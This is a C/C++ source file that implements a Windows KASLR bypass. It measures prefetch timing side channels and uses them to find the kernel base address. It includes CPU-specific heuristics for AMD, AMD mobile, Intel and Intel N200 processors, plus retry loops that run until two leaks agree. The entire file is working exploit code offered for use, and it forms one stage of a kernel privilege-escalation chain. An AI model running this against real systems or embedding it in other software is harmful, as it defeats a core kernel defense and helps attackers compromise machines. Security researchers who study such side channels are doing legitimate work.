#include <stdio.h>
#include "utils/prefectch/prefectch.hpp"
#pragma comment(lib,"ntdll.lib")
typedef enum PREFETCH_OPERATION {
    LeakKernelBase,
    PrintTimings
} PREFETCH_OPERATION;

ULONG_PTR KALSR_Bypass()
{
    PREFETCH_OPERATION op = LeakKernelBase;
    ULONG_PTR result = 0;
    switch (op) {
    case LeakKernelBase: {
        result = leak_kernel_base_reliable();
        printf("Kernel base: %p\n", result);
        break;
    }
    case PrintTimings:
        print_timings();
        break;
    }
    return result;
}


int average_sidechannel(PVOID addr)
{
    bad_syscall();
    UINT64 val = sidechannel(addr);
    for (int i = 0; i < ITERATIONS; i++) {
        val += sidechannel(addr);
    }

    return val / (ITERATIONS + 1);
}

UINT64 address_to_index(UINT64 addr)
{
    return (addr - KERNEL_LOWER_BOUND) / STEP;
}


BOOL is_below_average(UINT32 val)
{
    return (val <= G::avg - DIFF);
}

UINT64 leak_kernel_base_amd_mobile()
{
    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 candidates[ARR_SIZE] = { 0 };

    // get the timings for the whole search space
    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel(reinterpret_cast<PVOID>(test));
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    // total everything up for the average
    UINT32 total_for_avg = 0;
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        total_for_avg += data[i];
    }

    // calculate the average
    UINT32 arr_size = ARR_SIZE;
    G::avg = total_for_avg / arr_size;

    // get rid of outrageous ones
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        if (data[i] > (G::avg * 4))
        {
            data[i] = G::avg;
        }
        if (G::verbose > 1)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }

    if (G::verbose)
    {
        printf("avg for all: %i\n", G::avg);
    }

    int avg_signed = G::avg;
    // search for the kernel mapping
    for (UINT64 i = 0; i < ARR_SIZE - KERNEL_SECTIONS; i++)
    {
        UINT32 cur_avg = 0;
        for (UINT64 x = 0; x < KERNEL_SECTIONS; x++)
        {
            int cur_signed = data[i + x];
            int deviation = abs(int(cur_signed - G::avg));
            // if any of the values are below the average then bail
            if (deviation < G::avg / 8)
            {
                cur_avg = 0;
                break;
            }
            cur_avg = 1;
        }

        // if this region is above the average we have a hit
        if (cur_avg)
        {
            return KERNEL_LOWER_BOUND + (i * STEP);
        }
    }

    // failed to find anything
    return 0;
}


UINT64 leak_kernel_base_amd_mobile_reliable()
{
    UINT64 prev_leak = leak_kernel_base_amd_mobile();
    UINT64 kernel_base = 0;
    while (1)
    {
        UINT64 cur_leak = leak_kernel_base_amd_mobile();
        if (cur_leak == 0) {
            printf("leak failed, trying again...\n");
            continue;
        }
        if (cur_leak == prev_leak)
        {
            kernel_base = cur_leak;
            break;
        }

        printf("Kernel base leaks don't match (prev: %p cur: %p), retrying...\n", prev_leak, cur_leak);
        prev_leak = cur_leak;
    }

    return kernel_base;
}



UINT64 leak_kernel_base_amd()
{
    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 candidates[ARR_SIZE] = { 0 };

    // get the timings for the whole search space
    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    // total everything up for the average
    UINT32 total_for_avg = 0;
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        total_for_avg += data[i];
    }

    // calculate the average
    UINT32 arr_size = ARR_SIZE;
    G::avg = total_for_avg / arr_size;

    // get rid of outrageous ones
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        if (data[i] > (G::avg * 4))
        {
            data[i] = G::avg;
        }
        if (G::verbose > 1)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }

    if (G::verbose)
    {
        printf("avg for all: %i\n", G::avg);
    }


    // search for the kernel mapping
    for (UINT64 i = 0; i < ARR_SIZE - KERNEL_SECTIONS; i++)
    {
        UINT32 cur_avg = 0;
        for (UINT64 x = 0; x < KERNEL_SECTIONS; x++)
        {
            // if any of the values are below the average then bail
            if (data[i + x] <= G::avg)
            {
                cur_avg = 0;
                break;
            }
            // printf("possible: %p %i\n", KERNEL_LOWER_BOUND + ((i + x) * STEP), data[i + x]);
            cur_avg += data[i + x];
        }

        // if this region is above the average we have a hit
        cur_avg /= KERNEL_SECTIONS;
        if (cur_avg > G::avg)
        {
            return KERNEL_LOWER_BOUND + (i * STEP);
        }
    }

    // failed to find anything
    return 0;
}

// repeatedly try to leak the kernel base on amd. once two in a row match it will return
UINT64 leak_kernel_base_amd_reliable()
{
    UINT64 prev_leak = leak_kernel_base_amd();
    UINT64 kernel_base = 0;
    while (1)
    {
        UINT64 cur_leak = leak_kernel_base_amd();
        if (cur_leak == 0) {
            printf("leak failed, trying again...\n");
            continue;
        }
        if (cur_leak == prev_leak)
        {
            kernel_base = cur_leak;
            break;
        }

        printf("Kernel base leaks don't match (prev: %p cur: %p), retrying...\n", prev_leak, cur_leak);
        prev_leak = cur_leak;
    }

    return kernel_base;
}

UINT64 most_frequent(UINT64* arr, int n)
{
    UINT64 maxcount = 0;
    UINT64 element_having_max_freq = 0;
    for (int i = 0; i < n; i++) {
        UINT64 count = 0;
        for (int j = 0; j < n; j++) {
            if (arr[i] == arr[j])
                count++;
        }

        if (count > maxcount) {
            maxcount = count;
            element_having_max_freq = arr[i];
        }
    }

    return element_having_max_freq;
}

// single attempt of finding the kernel base on intel N200
UINT64 leak_kernel_base_intel_n200()
{
    G::avg = 0;

    ULONG x = 0;


    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 candidates[ARR_SIZE] = { 0 };
    UINT64 min = ~0, addr = ~0;
    UINT64 max = 0;

    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    // total everything up for the average
    UINT32 total_for_avg = 0;
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        total_for_avg += data[i];
    }

    // calculate the average
    UINT32 arr_size = ARR_SIZE;
    G::avg = total_for_avg / arr_size;

    // get rid of outrageous ones
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        if (i == 0)
        {
            continue;
        }

        // force down to avg
        if (data[i] > (G::avg))
        {
            data[i] = G::avg;
        }
        if (G::verbose > 1)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }

    if (G::verbose)
    {
        printf("avg for all: %i\n", G::avg);
    }

    UINT32 thresh_1 = G::avg / 3;

    UINT64 kernel_base = 0;

    for (UINT64 i = 0; i < ARR_SIZE - 2; i++)
    {
        UINT32 cur_avg = 0;
        if (data[i] < G::avg - (G::avg / thresh_1) &&
            data[i + 1] < G::avg - (G::avg / thresh_1))
        {
            return  (KERNEL_LOWER_BOUND + ((i - 9) * STEP));
        }
    }
    return kernel_base;
}

UINT64 leak_kernel_base_intel_n200_reliable()
{
    UINT64 prev_leak = leak_kernel_base_intel_n200();
    UINT64 kernel_base = 0;
    while (1)
    {
        UINT64 cur_leak = leak_kernel_base_intel_n200();
        if (cur_leak == 0) {
            printf("leak failed, trying again...\n");
            continue;
        }
        if (cur_leak == prev_leak)
        {
            kernel_base = cur_leak;
            break;
        }


        printf("Kernel base leaks don't match (prev: %p cur: %p), retrying...\n", prev_leak, cur_leak);
        prev_leak = cur_leak;
    }

    return kernel_base;
}

// single attempt of finding the kernel base on intel
UINT64 leak_kernel_base_intel()
{
    G::avg = 0;

    ULONG x = 0;


    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 candidates[ARR_SIZE] = { 0 };
    UINT64 min = ~0, addr = ~0;
    UINT64 max = 0;

    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    UINT32 total_for_avg = 0;

    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
    }


    // on intel we use the most frequently occcuring timing
    UINT32 arr_size = ARR_SIZE;
    G::avg = most_frequent(data, ARR_SIZE);


    // get rid of outrageous ones
    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        if (i == 0)
        {
            continue;
        }

        // force down to avg
        if (data[i] > (G::avg))
        {
            data[i] = G::avg;
        }
        if (G::verbose > 1)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }

    if (G::verbose)
    {
        printf("avg for all: %i\n", G::avg);
    }

    UINT32 thresh_1 = G::avg / 10;
    UINT32 thresh_2 = G::avg / 30;

    UINT64 kernel_base = 0;

    for (UINT64 i = 0; i < ARR_SIZE - KERNEL_SECTIONS; i++)
    {
        UINT32 cur_avg = 0;
        for (UINT64 x = 0; x < KERNEL_SECTIONS; x++)
        {
            // dont fluxuate wildly...
            if (data[i + x] >= G::avg - thresh_2)
            {
                cur_avg = 0xFFFFFFFF;
                break;
            }
            cur_avg += data[i + x];
        }
        if (cur_avg == 0xFFFFFFFF)
        {
            continue;
        }
        cur_avg /= KERNEL_SECTIONS;
        if (G::verbose) {
            printf("%p cur_avg: %i\n", (KERNEL_LOWER_BOUND + (i * STEP)), cur_avg);
        }
        if (cur_avg < (G::avg - thresh_1)) // we might need a threshold again for intel...
        {
            return KERNEL_LOWER_BOUND + (i * STEP);
        }
    }
    return kernel_base;
}


UINT64 leak_kernel_base_intel_old()
{
    ULONG x = 0;

    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 min = ~0, addr = ~0;

    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    UINT32 total_for_avg = 0;

    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + (i * STEP);
        }
        total_for_avg += data[i];
        //printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        if (G::verbose)
        {
            printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
        }
    }
    UINT32 arr_size = ARR_SIZE;
    G::avg = total_for_avg / arr_size;
    //printf("total for avg: %i\n", total_for_avg);
    //printf("array size: %i\n", ARR_SIZE);
    //printf("avg for all: %i\n", avg);

    for (UINT64 i = 0; i < ARR_SIZE - KERNEL_SECTIONS; i++)
    {
        if (is_below_average(data[i]))
        {
            BOOL possible = TRUE;
            for (UINT64 x = 0; x < KERNEL_SECTIONS; x++)
            {
                if (!is_below_average(data[i + x])) {
                    possible = FALSE;
                }
            }
            if (possible)
            {
                return KERNEL_LOWER_BOUND + ((i + 4) * STEP);
                //printf("Possible kernel base: %p\n", KERNEL_LOWER_BOUND + ((i + 4) * STEP));
            }
        }
    }
    return 0;
}

UINT64 leak_kernel_base_intel_reliable()
{
    UINT64 prev_leak = leak_kernel_base_intel();
    UINT64 kernel_base = 0;
    while (1)
    {
        UINT64 cur_leak = leak_kernel_base_intel();
        if (cur_leak == 0) {
            printf("leak failed, trying again...\n");
            continue;
        }
        if (cur_leak == prev_leak)
        {
            kernel_base = cur_leak;
            break;
        }


        printf("Kernel base leaks don't match (prev: %p cur: %p), retrying...\n", prev_leak, cur_leak);
        prev_leak = cur_leak;
    }

    return kernel_base;
}

VOID print_timings()
{
    ULONG x = 0;

    UINT64 data[ARR_SIZE] = { 0 };
    UINT64 min = ~0, addr = ~0;

    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (UINT64 idx = 0; idx < ARR_SIZE; idx++)
        {
            UINT64 test = SCAN_START + idx * STEP;
            bad_syscall();
            UINT64 time = sidechannel((PVOID)test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    UINT32 total_for_avg = 0;

    for (UINT64 i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + (i * STEP);
        }
        total_for_avg += data[i];
        printf("%llx %ld\n", (KERNEL_LOWER_BOUND + (i * STEP)), data[i]);
    }

    G::avg = total_for_avg / ARR_SIZE;

    printf("avg: %i\n", G::avg);
}

CPU_VENDOR determine_cpu_vendor()
{
    NTSTATUS status = 0;
    ULONG returned_len;
    CHAR brand_string[0x100] = { 0 };

    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)105, brand_string, sizeof(brand_string), &returned_len);
    if (status != 0)
    {
        printf("Failed to get processor brand string!\n");
        return CpuUnknown;
    }
    printf("Processor: %s\n", brand_string);

    if (strstr(brand_string, "Intel"))
    {
        if (strstr(brand_string, "N200"))
        {
            return CpuIntelN200;
        }
        return CpuIntel;
    }

    if (strstr(brand_string, "AMD"))
    {
        if (strstr(brand_string, "Mobile"))
        {
            return CpuAmdMobile;
        }
        return CpuAmd;
    }

    return CpuUnknown;
}

UINT64 leak_kernel_base_reliable()
{
    CPU_VENDOR vendor = determine_cpu_vendor();
    UINT64 kernel_base = 0;
    if (vendor == CpuAmd)
    {
        kernel_base = leak_kernel_base_amd_reliable();
    }
    else if (vendor == CpuAmdMobile)
    {
        kernel_base = leak_kernel_base_amd_mobile_reliable();
    }
    else if (vendor == CpuIntel)
    {
        kernel_base = leak_kernel_base_intel_reliable();
    }
    else if (vendor == CpuIntelN200)
    {
        kernel_base = leak_kernel_base_intel_n200_reliable();
    }
    else
    {
        printf("Unknown CPU vendor!\n");
        return 0;
    }

    return kernel_base;
}
